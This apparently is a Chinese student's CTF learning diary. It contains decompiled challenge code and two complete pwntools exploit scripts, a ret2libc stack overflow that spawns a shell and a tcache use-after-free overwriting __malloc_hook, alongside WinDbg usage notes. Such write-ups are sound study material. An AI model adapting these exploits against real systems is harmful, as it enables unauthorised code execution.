language-text" data-language="text"><code class="language-text">Arch:     amd64-64-little   RELRO:    Partial RELRO   Stack:    No canary found   NX:       NX enabled   PIE:      No PIE (0x3ff000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>main</code>函数里存在栈溢出，溢出长度刚好是一个地址</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"where is my stdout???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x60uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重点是<code>init</code>函数，输出被设置为全缓冲区，只有当缓冲区被填满时才会进行I&#x2F;O操作</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __fastcall <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也可以通过以下方式进行手动刷新缓冲区从而输出缓冲区中的内容：</p><ul><li>显式调用<code>fflush</code>函数</li><li>流被关闭（调用<code>fclose</code>）</li><li>程序正常结束（调用<code>exit</code>）</li></ul><p>程序其他部分包括<code>vuln extend</code>，<code>vuln</code>目的是进行更大长度的栈溢出，而<code>extend</code>是为了向输出缓冲区填入更多内容加快填满输出缓冲区，因为直接通过输出一个地址来填满输出缓冲区会由于连接不稳定而无法打通远程</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">extend</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-30h] BYREF</span>  __int64 v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-28h]</span>  __int64 v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-20h]</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-18h]</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-8h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+2Ch] [rbp-4h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Just to increase the number of got tables"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token char">'!olleh'</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v4 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v6 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"hello!"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"hello!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">srand</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  result <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v5 <span class="token operator">=</span> result<span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以本题的思路就是先利用<code>extend</code>填满输出缓冲区，再<code>ret2libc</code>，<code>exp</code>如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">31448</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>vuln <span class="token operator">=</span> <span class="token number">0x40125D</span>ret <span class="token operator">=</span> <span class="token number">0x000000000040101a</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d3</span>pop_rsi_r12_ret <span class="token operator">=</span> <span class="token number">0x00000000004013d1</span>puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>extend <span class="token operator">=</span> <span class="token number">0x401287</span>p1 <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>extend<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">54</span> <span class="token operator">+</span> p1 <span class="token operator">+</span> p64<span class="token punctuation">(</span>vuln<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./2.31/libc-2.31.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x84420</span>pop_rdx_ret <span class="token operator">=</span> <span class="token number">0x0000000000142c92</span> <span class="token operator">+</span> libc_baseexecve <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'execve'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_basep <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x28</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>execve<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-7"><a href="#7-7" class="headerlink" title="#7.7"></a>#7.7</h2><p>今天有点摆烂了…欸，周末嘛（bushi），主要是前一天睡的有点晚，直接润去姐姐家睡到了下午（）。晚上摸索了一下<code>windbg</code>基本用法</p><h3 id="windbg"><a href="#windbg" class="headerlink" title="windbg"></a>windbg</h3><p>打开文件：文件选项卡中打开exe文件</p><p>设置符号路径  ： <code>.sympath srv*</code></p><p>加载符号： <code>.reload</code></p><p>运行：<code>g</code></p><p>设置断点： <code>bp addr</code>  </p><p>查看堆栈状态：<code>kb</code></p><p>查看反汇编代码：<code>u addr</code></p><p>查看内容内容：双字：<code>dd/dc addr</code></p><p>​    Unicode 字符串 ：<code>du addr</code></p><p>​    十六进制双字：<code>dD addr</code></p><p>​    内存内容的指针：<code>dp addr</code></p><p>​    字：<code>dw addr</code></p><p>​    字节：<code>db addr</code></p><p>​    ASCII字符：<code>da addr</code></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">0:000> dc 0040000000400000  00405000 00406000 00407000 00408000  <span class="token punctuation">.</span>P<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>p<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  00409000 0040A000 0040B000 0040C000  <span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>`<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>0:000> du 0040000000400000  <span class="token string">"Hello, world!"</span>00400010  <span class="token string">"This is a test string."</span>0:000> dd 0040000000400000  00405000 00406000 00407000 0040800000400010  00409000 0040A000 0040B000 0040C0000:000> db 0040000000400000  48 65 6C 6C 6F 2C 20 77-6F 72 6C 64 21 00 00 00  Hello<span class="token punctuation">,</span> world!<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>00400010  54 68 69 73 20 69 73 20-61 20 74 65 73 74 20 73  This is a test s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看寄存器：<code>r</code>&#x2F;   <code>r register</code></p><p>修改寄存器：<code>r register = value</code></p><p>单步执行：不进入函数：<code>p</code></p><p>​         进入函数：<code>t</code></p><h2 id="7-8"><a href="#7-8" class="headerlink" title="#7.8"></a>#7.8</h2><p>今天还在捣鼓<code>windbg</code>，有点难绷…</p><h3 id="windbg-1"><a href="#windbg-1" class="headerlink" title="windbg"></a>windbg</h3><p><code>windbg</code>作用和<code>pwndbg</code>类似，还需要结合<code>IDA</code>逆向分析</p><p>显示指定的加载模块:<code>lm</code></p><p>bp、bu 和 bm 命令设置新的断点，但它们具有不同的特征：</p><p>●bp (设置断点) 命令在命令中指定的断点位置的地址处设置新的断点。 如果在设置断点时调试器无法解析断点位置的地址表达式，则 bp 断点将自动转换为 bu 断点。 使用 bp 命令创建在卸载模块时不再处于活动状态的断点</p><p>●bu (设置未解析断点) 命令设置延迟或未解析的断点。 bu 断点是在对命令中指定的断点位置的符号引用上设置的， (不在地址) 上，每当解析具有引用的模块时，就会激活该断点。 有关这些断点的详细信息</p><p>●bm (设置符号断点) 命令在与指定模式匹配的符号上设置新的断点。 此命令可以创建多个断点。 默认情况下，匹配模式后， bm 断点与 bu 断点相同。 也就是说， bm 断点是在符号引用上设置的延迟断点。 但是，bm &#x2F;d 命令会创建一个或多个 bp 断点。 每个断点在匹配位置的地址上设置，不跟踪模块状态</p><p>●.bpcmds&#x2F;bl 查看断点情况</p><pre class="line-numbers language-none"><code class="language-none">0:000&gt; bm myprogram!mem*   4: 0040d070 MyProgram!memcpy  5: 0040c560 MyProgram!memmove  6: 00408960 MyProgram!memset0:000&gt; bp MyTest+0xb 7 #前六次忽略此断点，第七次传递时，执行会停止<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-9"><a href="#7-9" class="headerlink" title="#7.9"></a>#7.9</h2><p>早上被摇去写了个<code>uaf</code>，然后一直在装<code>FakePDB</code>，救命，装不动了</p><h3 id="pwn题"><a href="#pwn题" class="headerlink" title="pwn题"></a>pwn题</h3><p><code>uaf</code>，限制15个堆，直接<code>tcachebin attack</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">delete</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v1 <span class="token operator">=</span> <span class="token function">readint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">></span> <span class="token number">15</span> <span class="token operator">||</span> <span class="token operator">!</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"NOOOOOOO!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_list<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"OKK!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span><span class="token comment">#context.terminal = ['tmux','splitw','-h']</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'size'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'content'</span><span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'choice >>'</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x3ebca0</span>malloc_hook <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseone <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span> <span class="token number">0x4f302</span><span class="token punctuation">,</span> <span class="token number">0x10a2fc</span><span class="token punctuation">]</span>ogg <span class="token operator">=</span> one<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseadd<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0x500</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>ogg<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="7-10"><a href="#7-10" class="headerlink" title="#7.10"></a>#7.10</h2><p>安装<code>FakePDB</code>，发现有<code>release</code>版本，唉前一天白浪费那么多时间去编译啦，但是还是只能生成<code>json</code>，<code>pdb</code>还是没生成的起来。然后被老师摇去看论文啦，一万多字的专业性文章真是考验专注力和耐心，过程中和学长交流才发现，其实<code>kb</code>查看栈回溯里的内容就行</p><h3 id="windbg-2"><a href="#windbg-2" class="headerlink" title="windbg"></a>windbg</h3><p>之前对<code>windbg</code>的误区是它既然不能识别函数那不就不能追溯到经过了哪些函数，昨天学到下断点是<code>module_name+address</code>，今天学长提到<code>kb</code>再去看了一下才发现这里的栈回溯就是<code>module_name+address</code>形式的代替了函数</p><p>例如这里的<code>GOM32Q_vc120_ReleaseQC+0x6371de</code>再去看<code>IDA</code>对应的就是<code>0x400000+0x6371de=0xA371DE</code>，即函数<code>_invoke_watson</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">0</span>:00<span class="token operator"><span class="token file-descriptor important">0</span>></span> kb <span class="token punctuation">\</span># ChildEBP RetAddr      Args to Child              WARNING: Stack unwind information not available. Following frames may be wrong.00 017eefc0 00e971cc     00000000 00000000 00000000 GOM32Q_vc120_ReleaseQC+0x6371de01 017eefe4 00a66a63     017ef0ec 00000104 05989178 GOM32Q_vc120_ReleaseQC+0x6371cc02 017ef338 00a4d040     0ada2b98 00000001 00d6723a GOM32Q_vc120_ReleaseQC+0x206a6303 017ef3fc 00d682e2     00ffb640 0ada2b98 00010004 GOM32Q_vc120_ReleaseQC+0x1ed04004 017ef41c 00d6392f     0000c322 0ada2b98 